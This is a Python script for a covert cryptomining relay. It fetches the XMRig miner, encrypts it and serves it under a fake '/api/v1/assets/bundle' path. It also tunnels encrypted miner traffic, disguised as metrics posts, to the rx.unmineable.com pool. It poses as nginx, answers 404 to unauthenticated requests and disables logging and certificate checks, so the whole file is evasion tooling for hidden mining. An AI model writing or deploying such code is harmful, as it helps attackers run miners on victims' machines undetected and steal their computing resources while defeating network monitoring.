#!/usr/bin/env python3

import base64
import hashlib
import hmac
import io
import json
import os
import secrets
import socket
import ssl
import tarfile
import threading
import time
import urllib.request
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

LISTEN_HOST = os.environ.get("LISTEN_HOST", "127.0.0.1")
LISTEN_PORT = int(os.environ.get("LISTEN_PORT", "8843"))
UPSTREAM_HOST = os.environ.get("UPSTREAM_HOST", "rx.unmineable.com")
UPSTREAM_PORT = int(os.environ.get("UPSTREAM_PORT", "443"))
ACCESS_KEY = os.environ["RELAY_ACCESS_KEY"].encode("utf-8")
EVENT_PATH = os.environ.get("EVENT_PATH", "/api/v1/metrics/batch")
BUNDLE_PATH = os.environ.get("BUNDLE_PATH", "/api/v1/assets/bundle")
MAX_SESSIONS = int(os.environ.get("MAX_SESSIONS", "300"))
SESSION_IDLE_SECONDS = int(os.environ.get("SESSION_IDLE_SECONDS", "600"))
LONG_POLL_SECONDS = float(os.environ.get("LONG_POLL_SECONDS", "2.5"))

RUNTIME_VERSION = "6.26.0"
RUNTIME_URL = (
    "https://github.com/xmrig/xmrig/releases/download/"
    f"v{RUNTIME_VERSION}/xmrig-{RUNTIME_VERSION}-linux-static-x64.tar.gz"
)
RUNTIME_SHA256 = "b20f39fc00d242e706b6c30367ad811c676e0575050a4ec2f30104b696944b49"

SESSIONS = {}
SESSIONS_LOCK = threading.Lock()
RUNTIME = None
RUNTIME_LOCK = threading.Lock()


def keystream_xor(data, identity, sequence, direction):
    output = bytearray(len(data))
    seed = f"{identity}:{sequence}:{direction}:".encode("ascii")
    offset = 0
    counter = 0
    while offset < len(data):
        block = hmac.new(
            ACCESS_KEY,
            seed + counter.to_bytes(4, "big"),
            hashlib.sha256,
        ).digest()
        count = min(len(block), len(data) - offset)
        for index in range(count):
            output[offset + index] = data[offset + index] ^ block[index]
        offset += count
        counter += 1
    return bytes(output)


def signature(*parts):
    digest = hmac.new(ACCESS_KEY, digestmod=hashlib.sha256)
    for part in parts:
        digest.update(part)
    return digest.hexdigest()


def load_runtime():
    global RUNTIME
    with RUNTIME_LOCK:
        if RUNTIME is not None:
            return RUNTIME
        request = urllib.request.Request(
            RUNTIME_URL,
            headers={"User-Agent": "asset-cache/1.0"},
        )
        with urllib.request.urlopen(request, timeout=45) as response:
            archive = io.BytesIO(response.read())
        with tarfile.open(fileobj=archive, mode="r:gz") as package:
            member = next(
                item
                for item in package.getmembers()
                if item.isfile() and item.name.endswith("/xmrig")
            )
            source = package.extractfile(member)
            if source is None:
                raise RuntimeError("runtime bundle has no executable")
            payload = source.read()
        if hashlib.sha256(payload).hexdigest() != RUNTIME_SHA256:
            raise RuntimeError("runtime bundle hash mismatch")
        RUNTIME = payload
        return RUNTIME


class Upstream:
    def __init__(self):
        raw = socket.create_connection((UPSTREAM_HOST, UPSTREAM_PORT), timeout=15)
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        self.socket = context.wrap_socket(raw, server_hostname=UPSTREAM_HOST)
        self.socket.settimeout(LONG_POLL_SECONDS)
        self.lock = threading.Lock()
        self.last_seen = time.monotonic()

    def exchange(self, upload):
        with self.lock:
            self.last_seen = time.monotonic()
            if upload:
                self.socket.sendall(upload)
            chunks = []
            try:
                first = self.socket.recv(65536)
                if not first:
                    raise ConnectionError("upstream closed")
                chunks.append(first)
                self.socket.settimeout(0.02)
                while sum(map(len, chunks)) < 65536:
                    try:
                        block = self.socket.recv(65536 - sum(map(len, chunks)))
                    except socket.timeout:
                        break
                    if not block:
                        break
                    chunks.append(block)
            except socket.timeout:
                pass
            finally:
                self.socket.settimeout(LONG_POLL_SECONDS)
            return b"".join(chunks)

    def close(self):
        try:
            self.socket.close()
        except OSError:
            pass


def prune_sessions():
    now = time.monotonic()
    expired = []
    with SESSIONS_LOCK:
        for identity, session in list(SESSIONS.items()):
            if now - session.last_seen >= SESSION_IDLE_SECONDS:
                expired.append(SESSIONS.pop(identity))
    for session in expired:
        session.close()


def session_for(identity):
    prune_sessions()
    with SESSIONS_LOCK:
        session = SESSIONS.get(identity)
        if session is not None:
            return session
        if len(SESSIONS) >= MAX_SESSIONS:
            raise RuntimeError("gateway capacity reached")
        session = Upstream()
        SESSIONS[identity] = session
        return session


def drop_session(identity):
    with SESSIONS_LOCK:
        session = SESSIONS.pop(identity, None)
    if session is not None:
        session.close()


class Handler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"
    server_version = "nginx"
    sys_version = ""

    def reply(self, status, body=b"", content_type="application/octet-stream"):
        self.send_response(status)
        self.send_header("Content-Type", content_type)
        self.send_header("Cache-Control", "no-store")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        if body:
            self.wfile.write(body)

    def do_GET(self):
        path = self.path.split("?", 1)[0]
        if path == "/health":
            with SESSIONS_LOCK:
                active = len(SESSIONS)
            body = json.dumps(
                {"status": "ok", "active": active},
                separators=(",", ":"),
            ).encode()
            self.reply(200, body, "application/json")
            return
        if path != BUNDLE_PATH:
            self.reply(404)
            return
        identity = self.headers.get("X-Client-Id", "")
        supplied = self.headers.get("X-Signature", "")
        if not (8 <= len(identity) <= 64) or not hmac.compare_digest(
            supplied,
            signature(BUNDLE_PATH.encode(), identity.encode()),
        ):
            self.reply(404)
            return
        try:
            payload = load_runtime()
            body = keystream_xor(payload, identity, 0, "bundle")
            body_sig = signature(identity.encode(), body)
            self.send_response(200)
            self.send_header("Content-Type", "application/octet-stream")
            self.send_header("Cache-Control", "private, max-age=900")
            self.send_header("X-Content-Signature", body_sig)
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
        except Exception:
            self.reply(503)

    def do_POST(self):
        path = self.path.split("?", 1)[0]
        if path != EVENT_PATH:
            self.reply(404)
            return
        identity = self.headers.get("X-Client-Id", "")
        sequence_text = self.headers.get("X-Event-Id", "")
        supplied = self.headers.get("X-Signature", "")
        try:
            sequence = int(sequence_text)
            content_length = int(self.headers.get("Content-Length", "0"))
        except ValueError:
            self.reply(404)
            return
        if (
            not (8 <= len(identity) <= 64)
            or not 0 <= sequence < 2**63
            or not 0 <= content_length <= 65536
        ):
            self.reply(404)
            return
        body = self.rfile.read(content_length)
        expected = signature(
            EVENT_PATH.encode(),
            identity.encode(),
            sequence_text.encode(),
            body,
        )
        if not hmac.compare_digest(supplied, expected):
            self.reply(404)
            return
        upload = keystream_xor(body, identity, sequence, "upload")
        try:
            download = session_for(identity).exchange(upload)
            result = keystream_xor(download, identity, sequence, "download")
            result_sig = signature(
                identity.encode(),
                sequence_text.encode(),
                result,
            )
            self.send_response(200)
            self.send_header("Content-Type", "application/octet-stream")
            self.send_header("Cache-Control", "no-store")
            self.send_header("X-Content-Signature", result_sig)
            self.send_header("Content-Length", str(len(result)))
            self.end_headers()
            if result:
                self.wfile.write(result)
        except Exception as error:
            drop_session(identity)
            print(
                f"session-reset={type(error).__name__}:{str(error)[:120]}",
                flush=True,
            )
            self.reply(410)

    def log_message(self, _format, *_args):
        return


if __name__ == "__main__":
    server = ThreadingHTTPServer((LISTEN_HOST, LISTEN_PORT), Handler)
    server.daemon_threads = True
    print(
        f"ready={LISTEN_HOST}:{LISTEN_PORT} upstream={UPSTREAM_HOST}:{UPSTREAM_PORT}",
        flush=True,
    )
    server.serve_forever()
